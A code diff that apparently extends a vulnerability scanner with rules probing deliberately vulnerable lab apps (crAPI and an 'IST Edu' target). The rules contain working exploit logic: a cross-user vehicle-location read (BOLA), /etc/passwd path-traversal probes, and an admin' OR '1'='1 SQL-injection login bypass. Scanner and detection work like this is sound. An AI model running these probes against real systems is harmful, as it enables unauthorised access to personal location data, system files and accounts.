@@ -36569,6 +36569,124 @@ const crapiMechanicReportRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const CRAPI_VEHICLE_UUID_RE =
+  /"vehicleid"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"/gi;
+
+async function tryCrapiLabJwt(ctx: RuleContext): Promise<string | null> {
+  const existing = await tryApiLabJwt(ctx);
+  if (existing) return existing;
+  const rand = `${Date.now()}`.slice(-7);
+  const creds = {
+    email: `thugir${rand}@scanner.local`,
+    password: "Test@123",
+    name: "Thugir",
+    number: `+1555${rand}`
+  };
+  const signupUrl = new URL("/identity/api/auth/signup", ctx.origin).toString();
+  const signup = await ctx.probe.get(signupUrl, {
+    method: "POST",
+    body: JSON.stringify(creds),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (signup.status >= 400 && !/registered successfully/i.test(signup.body)) return null;
+  const loginUrl = new URL("/identity/api/auth/login", ctx.origin).toString();
+  const login = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ email: creds.email, password: creds.password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (login.status < 200 || login.status >= 300) return null;
+  const m = login.body.match(/"token"\s*:\s*"(eyJ[^"]+)"/);
+  return m ? m[1] : null;
+}
+
+const crapiVehicleBolaLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const jwt = await tryCrapiLabJwt(ctx);
+  if (!jwt) return NEGATIVE;
+  const authHeaders = { Authorization: `Bearer ${jwt}` };
+  const postsUrl = new URL("/community/api/v2/community/posts/recent", ctx.origin).toString();
+  const postsDoc = await ctx.probe.get(postsUrl, {
+    maxBytes: 32768,
+    timeoutMs: 20000,
+    headers: authHeaders
+  });
+  if (postsDoc.status < 200 || postsDoc.status >= 400) return NEGATIVE;
+  const leakedUuids = [...postsDoc.body.matchAll(CRAPI_VEHICLE_UUID_RE)]
+    .map((m) => m[1]!)
+    .filter((id) => id.length > 0);
+  if (leakedUuids.length === 0) return NEGATIVE;
+  const ownUrl = new URL("/identity/api/v2/vehicle/vehicles", ctx.origin).toString();
+  const ownDoc = await ctx.probe.get(ownUrl, {
+    maxBytes: 8192,
+    timeoutMs: 15000,
+    headers: authHeaders
+  });
+  const ownUuids = new Set<string>();
+  if (ownDoc.status >= 200 && ownDoc.status < 400) {
+    try {
+      const own = JSON.parse(ownDoc.body) as Array<{ uuid?: string }>;
+      if (Array.isArray(own)) {
+        for (const v of own) {
+          if (v.uuid) ownUuids.add(v.uuid);
+        }
+      }
+    } catch {
+      /* empty own list still allows BOLA proof via community leak */
+    }
+  }
+  const targetUuid = leakedUuids.find((id) => !ownUuids.has(id));
+  if (!targetUuid) return NEGATIVE;
+  const locUrl = new URL(`/identity/api/v2/vehicle/${targetUuid}/location`, ctx.origin).toString();
+  const locDoc = await ctx.probe.get(locUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: authHeaders
+  });
+  if (locDoc.status < 200 || locDoc.status >= 400) return NEGATIVE;
+  if (!/"latitude"\s*:/.test(locDoc.body) || !/"longitude"\s*:/.test(locDoc.body)) return NEGATIVE;
+  let fullName: string | undefined;
+  try {
+    const loc = JSON.parse(locDoc.body) as { fullName?: string; carId?: string };
+    fullName = loc.fullName;
+  } catch {
+    /* location JSON parse optional */
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      postsUrl,
+      locationUrl: locUrl,
+      vehicleUuid: targetUuid,
+      fullName,
+      snippet: locDoc.body.slice(0, 200).trim(),
+      note: "crAPI community posts leak vehicleid UUIDs; GET /identity/api/v2/vehicle/{uuid}/location returns another user's GPS coordinates without object-level authorization — BOLA oracle (API1)"
+    }
+  };
+};
+
+const crapiVehicleRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vehicle\/vehicles/i.test(pageUrl)) return NEGATIVE;
+  const result = await crapiVehicleBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "crAPI /identity/api/v2/vehicle/vehicles route scan — community vehicleid leak + cross-user location read confirms BOLA (API1)"
+    }
+  };
+};
+
 const crapi2AuthLoginRouteLiveOracle: Rule = async (ctx) => {
   if (!isCrapi2Host(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
@@ -37996,6 +38114,59 @@ const istEduSearchXssRouteLiveOracle: Rule = async (ctx) => {
       url: searchUrl.toString(),
       snippet: doc.body.slice(0, 240).trim(),
       note: "IST Edu GET /api/search?q= reflects raw <script> payload unescaped in HTML — reflected XSS route oracle"
+    }
+  };
+};
+
+const istEduNoticesLfiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isIstEduHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/notices/i.test(pageUrl)) return NEGATIVE;
+  for (const payload of NOTICES_FILE_LFI_PAYLOADS) {
+    const url = new URL("/api/notices", ctx.origin);
+    url.searchParams.set("file", payload);
+    const doc = await ctx.probe.get(url.toString(), { maxBytes: 4096 });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    const marker = NOTICES_FILE_LFI_MARKERS.find((re) => re.test(doc.body));
+    if (!marker) continue;
+    const match = doc.body.match(marker);
+    return {
+      fired: true,
+      confidence: 0.94,
+      evidence: {
+        scannedUrl: pageUrl,
+        url: url.toString(),
+        marker: match?.[0]?.slice(0, 80) || "passwd contents",
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "IST Edu GET /api/notices?file= accepts path traversal and returns /etc/passwd — LFI route oracle"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const istEduPortalSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isIstEduHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/portal/i.test(pageUrl)) return NEGATIVE;
+  const portalUrl = new URL("/api/portal", ctx.origin).toString();
+  const doc = await ctx.probe.get(portalUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "admin' OR '1'='1", password: "x" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/Authentication Bypass Successful/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      portalUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "IST Edu POST /api/portal with admin' OR '1'='1 bypasses authentication — SQL injection login route oracle"
     }
   };
 };
@@ -39445,6 +39616,8 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsFileAwsRouteLiveOracle,
   crapiMechanicReportBolaLiveOracle,
   crapiMechanicReportRouteLiveOracle,
+  crapiVehicleBolaLiveOracle,
+  crapiVehicleRouteLiveOracle,
   crapi2AuthLoginRouteLiveOracle,
   crapi2ShopOrdersAllRouteLiveOracle,
   crapi2ShopOrdersIdBolaRouteLiveOracle,
@@ -39479,6 +39652,8 @@ export const RULES: Record<string, Rule> = {
   ginAndJuiceCatalogSearchXssLiveOracle,
   ginAndJuiceCatalogRouteLiveOracle,
   istEduSearchXssRouteLiveOracle,
+  istEduNoticesLfiRouteLiveOracle,
+  istEduPortalSqliRouteLiveOracle,
   clientSideArchonTrainingEvidence,
   clientSideArchonApiSecurityCurriculumEvidence,
   clientSideOverthewireBanditEvidence,
